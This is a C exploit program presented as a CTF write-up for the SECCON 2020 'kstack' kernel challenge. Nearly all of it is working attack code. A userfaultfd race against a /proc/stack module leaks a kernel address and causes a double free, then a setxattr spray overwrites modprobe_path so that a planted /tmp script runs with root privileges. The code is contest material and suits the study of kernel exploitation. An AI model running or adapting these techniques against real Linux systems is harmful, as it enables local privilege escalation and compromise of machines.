/******************************************************
 *
 * SECCON 2020 CTF KSTACK WRITEUP
 * By fr33bug
 *
 ******************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <attr/xattr.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <linux/userfaultfd.h>

#define CMD_PUSH			0x57ac0001
#define CMD_POP				0x57ac0002

/* Definition of error number */
/* Definition of error number */
enum {
        ERR_UFFD_SYSCALL = 1,
        ERR_UFFDAPI_IOCTL,
        ERR_MMAP,
        ERR_UFFDREG,
        ERR_OOTHER
};

typedef struct {
	void *addr;
	long uffd;
} uffd_t;

/* Global virables */
long pagesz = 0;
uffd_t me = {0};
/* exploit phase */
int phase = 1;
/* file descriptor of /proc/stack */
int fd;

unsigned long leaked_addr = 0, modprobe_path = 0;

/* communicate with kstack to push/pop elements */
void push (int fd, unsigned long *arg)
{
	(void)ioctl (fd, CMD_PUSH, arg);
}

void pop (int fd, unsigned long *arg)
{
	(void)ioctl (fd, CMD_POP, arg);
}

/* This is the userfaultfd setup template. 'pages' is the page number you want to monitor */
static int userfaultfd_setup (int pages)
{
	void *addr;
	struct uffdio_api api;
	struct uffdio_register reg;
	/* Register memory range to monitor */
	size_t rangesz;
	
	me.uffd = syscall (__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (me.uffd < 0)
	{
		return ERR_UFFD_SYSCALL;
	}
	
	api.api = UFFD_API;
	api.features = 0;
	
	if (ioctl (me.uffd, UFFDIO_API, &api) < 0)
	{
		return ERR_UFFDAPI_IOCTL;
	}
	
	rangesz = pagesz * pages;
	me.addr = mmap (NULL, rangesz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (me.addr == MAP_FAILED)
	{
		return ERR_MMAP;
	}
	
	reg.range.start = (unsigned long)me.addr;
	reg.range.len = rangesz;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl (me.uffd, UFFDIO_REGISTER, &reg) < 0)
	{
		return ERR_UFFDREG;
	}
	
	return 0;
}

/* this is the userfault handler function */
static void * userfaultfd_handler (void *arg)
{
	static long uffd;
	static struct uffd_msg msg = {0};
	struct uffdio_copy cpy = {0};
	static char *page = NULL;
	
	uffd = ((uffd_t *)arg)->uffd;
	
	if (!page)
	{
		page = mmap (NULL, pagesz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (page == (void *)-1)
		{
			printf ("[ERROR] mmap failed in %s:%d\n", __FUNCTION__, __LINE__);
			return NULL;
		}
		
		memset (page, 0, pagesz);
	}
	
	/* Loop to monitor messages and handle them */
	while (1)
	{
		int num;
		struct pollfd pfd;
		pfd.fd = uffd;
		pfd.events = POLLIN;
		num = poll (&pfd, 1, -1);
		if (num < 0)
		{
			printf ("[ERROR] Failed to poll. line:%d\n", __LINE__);
			return NULL;
		}
		
		if (read (uffd, &msg, sizeof(msg)) <= 0)
		{
			printf("[ERROR] failed to read. line: %d", __LINE__);
			return NULL;
		}
		
		if (msg.event != UFFD_EVENT_PAGEFAULT)
		{
			printf("[ERROR] Unexpected event catched. line: %d", __LINE__);
			return NULL;
		}
		
		if (!(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE))
		{
			printf("[DEBUG] read pagefault reached.\n");
			if (phase == 1) //triggered by push (fd, me.addr); [first time in userfaultfd handler]
			{
				phase ++;
				/*
				Because the main thread is hang up, so the newly allocated element has not been overwritten and the 'ns' pointer in the former shm_file_data exists. because ns in shm_file_data and value in element has the same offset, so when we pop an element, we get the value which in fact is the ns pointer.
				*/
				pop (fd, &leaked_addr); 
				printf("[DEBUG] leaked kernel address:%lx\n", leaked_addr);
			}
			else
			{	//Third time in userfaultfd handler
				printf("in %s second time.\n", __FUNCTION__);
				unsigned long tmp = 0xdeadbeef;
				push (fd, &tmp); // To allocate chunk again, it's content doesn't matter
				strncpy ((char *)&tmp, "/tmp/x", 8);
				push (fd, &tmp); //Allocate the chunk specified by modprobe_path-8, so we can write the block to overwrite modprobe_path
				system ("/tmp/dummy");
				system ("cat /flag");
			}
			
			cpy.src = (unsigned long)page;
			cpy.dst = (unsigned long)msg.arg.pagefault.address & ~(pagesz - 1);
			cpy.len = pagesz;
			cpy.mode = 0;
			cpy.copy = 0;
			if (ioctl (uffd, UFFDIO_COPY, &cpy) < 0)
			{
				printf("[ERROR] failed to do uffdio_copy. line:%d\n", __LINE__);
				return NULL;
			}
		}
		else
		{
			printf("[DEBUG] write pagefault reached.\n"); //triggerred by pop (fd, me.addr + pagesz);[second time in userfaultfd handler]
			unsigned long t;
			pop (fd, &t); /* Now the element has been double freed. */
			
			struct uffdio_range range;
			range.start = msg.arg.pagefault.address & ~(pagesz - 1);
			range.len = pagesz;
			(void)ioctl (uffd, UFFDIO_UNREGISTER, &range);
			(void)ioctl (uffd, UFFDIO_WAKE, &range);
		}
	}
}

/* allocate shm_file_data struct from kmalloc-32 and then free it back to kmalloc-32. */
static int alloc_and_free_shm_file_data ()
{
	char *shmaddr = NULL;
	int shmid = shmget (0xAA, 0x1000, SHM_R | SHM_W | IPC_CREAT);
	if (shmid < 0)
	{
		printf ("[ERROR]shmget() failed\n");
		return ERR_OOTHER;
	}
	
	shmaddr = shmat (shmid, 0, 0);
	if (shmaddr == (void *)-1)
	{
		printf ("[ERROR]shmat() failed\n");
		return ERR_OOTHER;
	}
	
	shmdt (shmaddr);
}

void prepare_malfile ()
{
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}

int main ()
{
	int ret = 0;
	pthread_t thr = {0};
	
	prepare_malfile ();
	
	pagesz = sysconf(_SC_PAGESIZE);
	
	/* setup userfaultfd */
	if ((ret = userfaultfd_setup(4)) < 0)
	{
		printf ("[ERROR] userfaultfd setup failed. errno=%d\n", ret);
		return ret;
	}
	
	/* create a new thread to monitor and handle the fault. */
	if (pthread_create (&thr, NULL, userfaultfd_handler, (void *)&me) != 0)
	{
		printf ("[ERROR] pthread_create failed. line:%d\n", __LINE__);
		return ERR_OOTHER;
	}
	
	fd = open ("/proc/stack", O_RDWR);
	if (fd < 0)
	{
		printf ("[ERROR] open /proc/kstack failed.\n");
		return ERR_OOTHER;
	}
	
	alloc_and_free_shm_file_data ();
	
	/* push the first 8 bytes of the first page in the range that we monitor. At this time, the page is not loaded, so an userfault will be triggered and userfaultfd handler will be called. In the handler, we pop the element to leak kernel address.*/
	push (fd, me.addr);
	
	/* Now we can calculate the modprobe_path address */
	modprobe_path = leaked_addr + (0xFFFFFFFF81C2C540 - 0xffffffff81c37bc0);
	printf("[DEBUG] modprobe_path address is : 0x%lx\n", modprobe_path);
	
	/* push an element and then pop it two times to result in a double free vulnerability. one free is in the main thread, the other one is in the handler thread */
	unsigned long dummy = 0xAABBCCDD;
	push (fd, &dummy);
	pop (fd, me.addr + pagesz); //POP the element to the beginning of the second page which has not been loaded, so userfault handler is called.
	
	*(unsigned long *)(me.addr + pagesz *2 - 8) = modprobe_path - 8; //overwrite chunk's fd
	setxattr ("/init", "attr", me.addr + pagesz *2 - 8, 32, 0); //in kernel, an element of 32bytes will be allocated and when copy_from_user() read the third page, userfault will be triggerred.
	
	return 0;
}
